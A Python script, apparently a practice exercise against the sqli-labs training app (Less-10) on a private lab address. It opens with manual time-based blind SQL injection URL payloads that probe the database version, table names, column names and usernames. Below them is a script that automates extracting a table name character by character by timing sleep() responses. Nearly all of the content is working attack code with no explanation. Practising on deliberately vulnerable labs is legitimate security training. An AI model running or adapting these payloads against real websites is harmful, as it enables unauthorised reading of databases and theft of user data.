'''
192.168.3.15/sqlib/Less-10/?id=1" and if(left(version(),1)=5,sleep(5),1)--+
192.168.3.15/sqlib/Less-10/?id=1" and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,1,sleep(5))--+
192.168.3.15/sqlib/Less-10/?id=1" and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))>116,1,sleep(5))--+
192.168.3.15/sqlib/Less-10/?id=1" and if(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+
'''



import requests
import time

url = 'http://192.168.3.15/sqlib/Less-10/?id=1'

def sqlin(sql,i):
    t1 = time.time()
    r = requests.get(sql)
    t2 = time.time()
    if t2-t1 > 5:
        return(i)
    else:
        print(sql)



def get_length():
    for i in range(1,50):
        payload = '\" and if((select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)={0},sleep(5),1)--+'.format(i)
        leng = sqlin(url+payload,i)
        if leng:
            print('length is:',i)
            return i




def get_data(loca):
    for i in range(65,123):
        payload = '\" and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1},sleep(5),1)--+'.format(loca,i)
        data = sqlin(url+payload,i)
        if data:
            return(chr(data))

if __name__ ==  '__main__':
    data = ''
    length = get_length()
    for i in range(1,length+1):
        data += get_data(i)
        print(data)

